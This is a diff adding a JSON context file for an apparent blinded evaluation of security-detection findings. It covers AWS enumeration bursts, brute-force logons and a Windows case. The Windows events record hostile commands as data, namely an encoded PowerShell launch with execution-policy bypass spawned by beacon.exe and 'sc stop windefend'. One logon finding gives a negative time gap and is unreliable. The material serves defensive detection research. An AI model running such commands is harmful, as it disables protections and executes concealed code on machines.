@@ -1,0 +1,4678 @@
+{
+ "generated_at": "2026-09-13T21:56:59.453384+00:00",
+ "head": "41c0d97",
+ "purpose": "Deterministic context for the M19b blinded hypothesis review: the findings every arm started from, and a one-line description of every event any hypothesis cites. Contains no model output and no arm identity.",
+ "manifest_hash": "1764be3cea5a5afd532038a40c934fc1d79baf88d91016a29ab3bfba6911aa15",
+ "telemetry_hash_checks": {
+  "attack_data_aws": {
+   "manifest_telemetry_hash": "852972e029a4e5ce0451c6465b8a4e91b65ea613f07e3795a626939132fa5192",
+   "rebuilt_telemetry_hash": "852972e029a4e5ce0451c6465b8a4e91b65ea613f07e3795a626939132fa5192",
+   "equal": true
+  },
+  "comiset": {
+   "manifest_telemetry_hash": "73b0a0eeada82f3026eefa57a3dc5349a33e45cb70b15dba9ba416c7a0d02ee6",
+   "rebuilt_telemetry_hash": "73b0a0eeada82f3026eefa57a3dc5349a33e45cb70b15dba9ba416c7a0d02ee6",
+   "equal": true
+  },
+  "flaws_cloud": {
+   "manifest_telemetry_hash": "d124dc925e7743723f164b2bb800d3012f1a678fd0864d2521e4450a4ce4f0c4",
+   "rebuilt_telemetry_hash": "d124dc925e7743723f164b2bb800d3012f1a678fd0864d2521e4450a4ce4f0c4",
+   "equal": true
+  },
+  "synthetic:INC-001": {
+   "manifest_telemetry_hash": "d6e61884e3bb3116fc53d20f0fbb91ab8e536650497026dc30fca7007b50950b",
+   "rebuilt_telemetry_hash": "d6e61884e3bb3116fc53d20f0fbb91ab8e536650497026dc30fca7007b50950b",
+   "equal": true
+  },
+  "synthetic:INC-002": {
+   "manifest_telemetry_hash": "781834ed6d40ddc2097f55ab3b448b4378177f688cb5f9e6f37adaff9915ebec",
+   "rebuilt_telemetry_hash": "781834ed6d40ddc2097f55ab3b448b4378177f688cb5f9e6f37adaff9915ebec",
+   "equal": true
+  },
+  "synthetic:INC-005": {
+   "manifest_telemetry_hash": "92b3dbe586ffaf95af0a4fdb0aaa3fa6657afdd65c0a3b53498d7b4503846d65",
+   "rebuilt_telemetry_hash": "92b3dbe586ffaf95af0a4fdb0aaa3fa6657afdd65c0a3b53498d7b4503846d65",
+   "equal": true
+  },
+  "synthetic:INC-004": {
+   "manifest_telemetry_hash": "46ad228dbc8eaff1e4f9d4cf9903ed556f51be41ab022be21ec93215ae91c483",
+   "rebuilt_telemetry_hash": "46ad228dbc8eaff1e4f9d4cf9903ed556f51be41ab022be21ec93215ae91c483",
+   "equal": true
+  }
+ },
+ "arm_file_sha256": {
+  "A": "1be01e011a229a244af99d4a9bab593f9ac54e9ee89e06b8a54107292a7b07ff",
+  "B": "f831adbdee680f1c38d4bdc4052e8b179bc4e8de1812288d04972cccdebd04c3",
+  "C": "b7d053d75ecaae4862625fa727463ee94ae952daf8765b2416c35faa6d60fea6"
+ },
+ "cases": [
+  {
+   "corpus": "attack_data_aws",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-002337",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "HIGH",
+     "device": "aws:731544447609/eu-central-1",
+     "actor": "cloudsploit",
+     "reason": "'cloudsploit' made 2164 read calls across 49 distinct services in 233s, 2072 of them refused for want of authority (96%). Breadth with no permission behind it is enumeration rather than administration. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-002337",
+      "cloudtrail-control-001181",
+      "cloudtrail-control-001182",
+      "cloudtrail-control-002326",
+      "cloudtrail-control-001156",
+      "cloudtrail-control-001170",
+      "cloudtrail-control-001108",
+      "cloudtrail-control-001115",
+      "cloudtrail-control-002281",
+      "cloudtrail-control-002247",
+      "cloudtrail-control-002231",
+      "cloudtrail-control-000942",
+      "cloudtrail-control-000945",
+      "cloudtrail-control-002189",
+      "cloudtrail-control-002173",
+      "cloudtrail-control-000918",
+      "cloudtrail-control-000914",
+      "cloudtrail-control-002121",
+      "cloudtrail-control-002072",
+      "cloudtrail-control-002074"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-002337",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:731544447609/eu-central-1",
+     "actor": "cloudsploit",
+     "reason": "'cloudsploit' was refused authorization 2092 times in 233s, across 100 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-002337",
+      "cloudtrail-control-001182",
+      "cloudtrail-control-002326",
+      "cloudtrail-control-001156",
+      "cloudtrail-control-001160",
+      "cloudtrail-control-001161",
+      "cloudtrail-control-001162",
+      "cloudtrail-control-001165",
+      "cloudtrail-control-001166",
+      "cloudtrail-control-001167",
+      "cloudtrail-control-001168",
+      "cloudtrail-control-001170",
+      "cloudtrail-control-001171",
+      "cloudtrail-control-001115",
+      "cloudtrail-control-002281",
+      "cloudtrail-control-002282",
+      "cloudtrail-control-002283",
+      "cloudtrail-control-002284",
+      "cloudtrail-control-002261",
+      "cloudtrail-control-002247"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-000914",
+    "cloudtrail-control-000918",
+    "cloudtrail-control-000942",
+    "cloudtrail-control-000945",
+    "cloudtrail-control-001108",
+    "cloudtrail-control-001115",
+    "cloudtrail-control-001156",
+    "cloudtrail-control-001160",
+    "cloudtrail-control-001161",
+    "cloudtrail-control-001162",
+    "cloudtrail-control-001165",
+    "cloudtrail-control-001166",
+    "cloudtrail-control-001167",
+    "cloudtrail-control-001168",
+    "cloudtrail-control-001170",
+    "cloudtrail-control-001171",
+    "cloudtrail-control-001181",
+    "cloudtrail-control-001182",
+    "cloudtrail-control-002072",
+    "cloudtrail-control-002074",
+    "cloudtrail-control-002121",
+    "cloudtrail-control-002173",
+    "cloudtrail-control-002189",
+    "cloudtrail-control-002231",
+    "cloudtrail-control-002247",
+    "cloudtrail-control-002261",
+    "cloudtrail-control-002281",
+    "cloudtrail-control-002282",
+    "cloudtrail-control-002283",
+    "cloudtrail-control-002284",
+    "cloudtrail-control-002326",
+    "cloudtrail-control-002337"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-000914": {
+     "timestamp": "2021-04-13 11:33:08+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ssm:parameter [denied]"
+    },
+    "cloudtrail-control-000918": {
+     "timestamp": "2021-04-13 11:33:07+00:00",
+     "device": "aws:111111111111/us-west-2",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ses:active-receipt-rule-set [allowed]"
+    },
+    "cloudtrail-control-000942": {
+     "timestamp": "2021-04-13 11:33:04+00:00",
+     "device": "aws:111111111111/us-west-2",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe rds:db-instance [denied]"
+    },
+    "cloudtrail-control-000945": {
+     "timestamp": "2021-04-13 11:33:04+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe redshift:cluster [denied]"
+    },
+    "cloudtrail-control-001108": {
+     "timestamp": "2021-04-13 11:32:54+00:00",
+     "device": "aws:111111111111/us-east-2",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe elasticfilesystem:file-system [allowed]"
+    },
+    "cloudtrail-control-001115": {
+     "timestamp": "2021-04-13 11:32:54+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe elasticloadbalancing:load-balancer [denied]"
+    },
+    "cloudtrail-control-001156": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:volume [denied]"
+    },
+    "cloudtrail-control-001160": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:subnet [denied]"
+    },
+    "cloudtrail-control-001161": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:vpc [denied]"
+    },
+    "cloudtrail-control-001162": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:security-group [denied]"
+    },
+    "cloudtrail-control-001165": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:vpc-peering-connection [denied]"
+    },
+    "cloudtrail-control-001166": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:route-table [denied]"
+    },
+    "cloudtrail-control-001167": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:flow-log [denied]"
+    },
+    "cloudtrail-control-001168": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe ec2:instance [denied]"
+    },
+    "cloudtrail-control-001170": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe config:configuration-recorder [denied]"
+    },
+    "cloudtrail-control-001171": {
+     "timestamp": "2021-04-13 11:32:53+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe config:configuration-recorder-status [denied]"
+    },
+    "cloudtrail-control-001181": {
+     "timestamp": "2021-04-13 11:32:52+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe logs:log-group [allowed]"
+    },
+    "cloudtrail-control-001182": {
+     "timestamp": "2021-04-13 11:32:52+00:00",
+     "device": "aws:111111111111/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit describe cloudtrail:trail [denied]"
+    },
+    "cloudtrail-control-002072": {
+     "timestamp": "2021-04-13 11:34:43+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list athena:work-group [denied]"
+    },
+    "cloudtrail-control-002074": {
+     "timestamp": "2021-04-13 11:34:43+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit get apigateway:rest-apis [denied]"
+    },
+    "cloudtrail-control-002121": {
+     "timestamp": "2021-04-13 11:33:10+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list transfer:server [denied]"
+    },
+    "cloudtrail-control-002173": {
+     "timestamp": "2021-04-13 11:33:06+00:00",
+     "device": "aws:731544447609/us-west-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list secretsmanager:secret [denied]"
+    },
+    "cloudtrail-control-002189": {
+     "timestamp": "2021-04-13 11:33:05+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list s3:bucket [denied]"
+    },
+    "cloudtrail-control-002231": {
+     "timestamp": "2021-04-13 11:33:03+00:00",
+     "device": "aws:731544447609/us-east-2",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list lambda:function [denied]"
+    },
+    "cloudtrail-control-002247": {
+     "timestamp": "2021-04-13 11:33:02+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list kms:key [denied]"
+    },
+    "cloudtrail-control-002261": {
+     "timestamp": "2021-04-13 11:33:00+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit generate iam:credential-report [denied]"
+    },
+    "cloudtrail-control-002281": {
+     "timestamp": "2021-04-13 11:32:57+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list iam:policy [denied]"
+    },
+    "cloudtrail-control-002282": {
+     "timestamp": "2021-04-13 11:32:57+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit get iam:account-password-policy [denied]"
+    },
+    "cloudtrail-control-002283": {
+     "timestamp": "2021-04-13 11:32:57+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list iam:user [denied]"
+    },
+    "cloudtrail-control-002284": {
+     "timestamp": "2021-04-13 11:32:57+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list iam:group [denied]"
+    },
+    "cloudtrail-control-002326": {
+     "timestamp": "2021-04-13 11:32:52+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list cloudfront:distribution [denied]"
+    },
+    "cloudtrail-control-002337": {
+     "timestamp": "2021-04-13 11:32:51+00:00",
+     "device": "aws:731544447609/eu-central-1",
+     "actor": "cloudsploit",
+     "event_type": "control",
+     "summary": "cloudsploit list acm:certificate [denied]"
+    }
+   }
+  },
+  {
+   "corpus": "attack_data_aws",
+   "case_id": "CASE-002",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-004:cloudtrail-control-001224",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudmapper",
+     "reason": "'cloudmapper' was refused authorization 37 times in 284s, across 5 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-001224",
+      "cloudtrail-control-001222",
+      "cloudtrail-control-001220",
+      "cloudtrail-control-001219",
+      "cloudtrail-control-001204"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-001204",
+    "cloudtrail-control-001219",
+    "cloudtrail-control-001220",
+    "cloudtrail-control-001222",
+    "cloudtrail-control-001224"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-001204": {
+     "timestamp": "2021-04-13 13:35:10+00:00",
+     "device": "aws:731544447609/eu-north-1",
+     "actor": "cloudmapper",
+     "event_type": "control",
+     "summary": "cloudmapper get glue:trigger [denied]"
+    },
+    "cloudtrail-control-001219": {
+     "timestamp": "2021-04-13 13:34:57+00:00",
+     "device": "aws:731544447609/eu-north-1",
+     "actor": "cloudmapper",
+     "event_type": "control",
+     "summary": "cloudmapper get glue:job [denied]"
+    },
+    "cloudtrail-control-001220": {
+     "timestamp": "2021-04-13 13:33:45+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudmapper",
+     "event_type": "control",
+     "summary": "cloudmapper list organizations:account [denied]"
+    },
+    "cloudtrail-control-001222": {
+     "timestamp": "2021-04-13 13:31:05+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudmapper",
+     "event_type": "control",
+     "summary": "cloudmapper get kms:key-rotation-status [denied]"
+    },
+    "cloudtrail-control-001224": {
+     "timestamp": "2021-04-13 13:30:36+00:00",
+     "device": "aws:731544447609/us-east-1",
+     "actor": "cloudmapper",
+     "event_type": "control",
+     "summary": "cloudmapper list kms:key-policy [denied]"
+    }
+   }
+  },
+  {
+   "corpus": "comiset",
+   "case_id": "CASE-001",
+   "rebuilt": true,
+   "severity": "MEDIUM",
+   "rule_ids": [
+    "ATH-002"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-002:comiset_slice.jsonl:41ece3af25e0f38cccc6d27422a388c739761353",
+     "rule_id": "ATH-002",
+     "title": "Encoded PowerShell command execution",
+     "severity": "MEDIUM",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "reason": "PowerShell ran a base64-encoded command. The payload does not obviously fetch remote code, but the command line also suppresses the console window and/or the user profile. Evasion flags observed: no profile.",
+     "event_ids": [
+      "comiset_slice.jsonl:41ece3af25e0f38cccc6d27422a388c739761353"
+     ]
+    },
+    {
+     "finding_id": "ATH-002:comiset_slice.jsonl:574dffe7a299a4ad9d2b1150574e2cff72b4efb4",
+     "rule_id": "ATH-002",
+     "title": "Encoded PowerShell command execution",
+     "severity": "MEDIUM",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "reason": "PowerShell ran a base64-encoded command. The payload does not obviously fetch remote code, but the command line also suppresses the console window and/or the user profile. Evasion flags observed: no profile.",
+     "event_ids": [
+      "comiset_slice.jsonl:574dffe7a299a4ad9d2b1150574e2cff72b4efb4"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "comiset_slice.jsonl:41ece3af25e0f38cccc6d27422a388c739761353",
+    "comiset_slice.jsonl:574dffe7a299a4ad9d2b1150574e2cff72b4efb4"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "comiset_slice.jsonl:0a7e197d2e49a2d65785fa2efbca8a1bbdfcdb8a": {
+     "timestamp": "2022-11-18 10:37:49.512000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "cmd.exe -> beacon.exe | beacon.exe"
+    },
+    "comiset_slice.jsonl:41ece3af25e0f38cccc6d27422a388c739761353": {
+     "timestamp": "2022-11-18 11:15:51.211000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "beacon.exe -> powershell.exe | powershell -nop -exec bypass -encodedcommand sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbeag8adwbuagwabwbhagqauwb0ahiaaqb"
+    },
+    "comiset_slice.jsonl:574dffe7a299a4ad9d2b1150574e2cff72b4efb4": {
+     "timestamp": "2022-11-18 11:17:30.010000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "beacon.exe -> powershell.exe | powershell -nop -exec bypass -encodedcommand sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbeag8adwbuagwabwbhagqauwb0ahiaaqb"
+    },
+    "comiset_slice.jsonl:b9a5cb4bdabc2fe887d9224d6c42056e5b64ff90": {
+     "timestamp": "2022-11-18 10:27:21.393000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "remotemouse.exe -> cmd.exe | \"c:\\windows\\system32\\cmd.exe\""
+    }
+   }
+  },
+  {
+   "corpus": "comiset",
+   "case_id": "CASE-002",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "ATH-012"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-012:comiset_slice.jsonl:4bdb0f0e83e0a62d3ca40b33ef0d892801fd4d3b",
+     "rule_id": "ATH-012",
+     "title": "Security product disabled or reconfigured",
+     "severity": "HIGH",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "reason": "1 distinct security-control change(s) on desktop-4pvps6e by 'system': a security service was stopped. A single change is often administrative; several in one window is the shape of an attacker clearing the way for what comes next.",
+     "event_ids": [
+      "comiset_slice.jsonl:4bdb0f0e83e0a62d3ca40b33ef0d892801fd4d3b"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "comiset_slice.jsonl:4bdb0f0e83e0a62d3ca40b33ef0d892801fd4d3b"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "comiset_slice.jsonl:2123df97130430b012740761f3c88c0bbe4bc345": {
+     "timestamp": "2022-11-19 19:00:59.545000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "remotemouse.exe -> cmd.exe | \"c:\\windows\\system32\\cmd.exe\""
+    },
+    "comiset_slice.jsonl:4bdb0f0e83e0a62d3ca40b33ef0d892801fd4d3b": {
+     "timestamp": "2022-11-19 19:12:55.683000+00:00",
+     "device": "desktop-4pvps6e",
+     "actor": "system",
+     "event_type": "process",
+     "summary": "cmd.exe -> sc.exe | sc stop windefend"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-005",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "ATH-005"
+   ],
+   "findings": [
+    {
+     "finding_id": "ATH-005:cloudtrail-logon-002652",
+     "rule_id": "ATH-005",
+     "title": "Failed logon burst followed by successful authentication",
+     "severity": "CRITICAL",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "reason": "53 failed logons for 'SecurityMokey' on aws:811596193553/us-east-1 from 255.253.125.115 within 247s. A successful logon followed at 22:26:48, -148s after the last failure. This may indicate the credential was successfully guessed and the account is now compromised.",
+     "event_ids": [
+      "cloudtrail-logon-002652",
+      "cloudtrail-logon-002653",
+      "cloudtrail-logon-002654",
+      "cloudtrail-logon-002655",
+      "cloudtrail-logon-002656",
+      "cloudtrail-logon-002657",
+      "cloudtrail-logon-002658",
+      "cloudtrail-logon-002659",
+      "cloudtrail-logon-002660",
+      "cloudtrail-logon-002661",
+      "cloudtrail-logon-002665",
+      "cloudtrail-logon-002664",
+      "cloudtrail-logon-002662",
+      "cloudtrail-logon-002663",
+      "cloudtrail-logon-002666",
+      "cloudtrail-logon-002667",
+      "cloudtrail-logon-002668",
+      "cloudtrail-logon-002669",
+      "cloudtrail-logon-002670",
+      "cloudtrail-logon-002671",
+      "cloudtrail-logon-002672",
+      "cloudtrail-logon-002673",
+      "cloudtrail-logon-002674",
+      "cloudtrail-logon-002676",
+      "cloudtrail-logon-002675",
+      "cloudtrail-logon-002683",
+      "cloudtrail-logon-002685",
+      "cloudtrail-logon-002689",
+      "cloudtrail-logon-002696",
+      "cloudtrail-logon-002698",
+      "cloudtrail-logon-002700",
+      "cloudtrail-logon-002709",
+      "cloudtrail-logon-002713",
+      "cloudtrail-logon-002727",
+      "cloudtrail-logon-002730",
+      "cloudtrail-logon-002734",
+      "cloudtrail-logon-002738",
+      "cloudtrail-logon-002739",
+      "cloudtrail-logon-002746",
+      "cloudtrail-logon-002749",
+      "cloudtrail-logon-002754",
+      "cloudtrail-logon-002760",
+      "cloudtrail-logon-002763",
+      "cloudtrail-logon-002764",
+      "cloudtrail-logon-002772",
+      "cloudtrail-logon-002778",
+      "cloudtrail-logon-002779",
+      "cloudtrail-logon-002786",
+      "cloudtrail-logon-002791",
+      "cloudtrail-logon-002809",
+      "cloudtrail-logon-002811",
+      "cloudtrail-logon-002815",
+      "cloudtrail-logon-002820",
+      "cloudtrail-logon-002822"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-logon-002652",
+    "cloudtrail-logon-002653",
+    "cloudtrail-logon-002654",
+    "cloudtrail-logon-002655",
+    "cloudtrail-logon-002656",
+    "cloudtrail-logon-002657",
+    "cloudtrail-logon-002658",
+    "cloudtrail-logon-002659",
+    "cloudtrail-logon-002660",
+    "cloudtrail-logon-002661",
+    "cloudtrail-logon-002662",
+    "cloudtrail-logon-002663",
+    "cloudtrail-logon-002664",
+    "cloudtrail-logon-002665",
+    "cloudtrail-logon-002666",
+    "cloudtrail-logon-002667",
+    "cloudtrail-logon-002668",
+    "cloudtrail-logon-002669",
+    "cloudtrail-logon-002670",
+    "cloudtrail-logon-002671",
+    "cloudtrail-logon-002672",
+    "cloudtrail-logon-002673",
+    "cloudtrail-logon-002674",
+    "cloudtrail-logon-002675",
+    "cloudtrail-logon-002676",
+    "cloudtrail-logon-002683",
+    "cloudtrail-logon-002685",
+    "cloudtrail-logon-002689",
+    "cloudtrail-logon-002696",
+    "cloudtrail-logon-002698",
+    "cloudtrail-logon-002700",
+    "cloudtrail-logon-002709",
+    "cloudtrail-logon-002713",
+    "cloudtrail-logon-002727",
+    "cloudtrail-logon-002730",
+    "cloudtrail-logon-002734",
+    "cloudtrail-logon-002738",
+    "cloudtrail-logon-002739",
+    "cloudtrail-logon-002746",
+    "cloudtrail-logon-002749",
+    "cloudtrail-logon-002754",
+    "cloudtrail-logon-002760",
+    "cloudtrail-logon-002763",
+    "cloudtrail-logon-002764",
+    "cloudtrail-logon-002772",
+    "cloudtrail-logon-002778",
+    "cloudtrail-logon-002779",
+    "cloudtrail-logon-002786",
+    "cloudtrail-logon-002791",
+    "cloudtrail-logon-002809",
+    "cloudtrail-logon-002811",
+    "cloudtrail-logon-002815",
+    "cloudtrail-logon-002820",
+    "cloudtrail-logon-002822"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-logon-002652": {
+     "timestamp": "2017-05-26 22:25:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002653": {
+     "timestamp": "2017-05-26 22:25:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002654": {
+     "timestamp": "2017-05-26 22:25:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002655": {
+     "timestamp": "2017-05-26 22:25:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002656": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002657": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002658": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002659": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002660": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002661": {
+     "timestamp": "2017-05-26 22:25:10+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
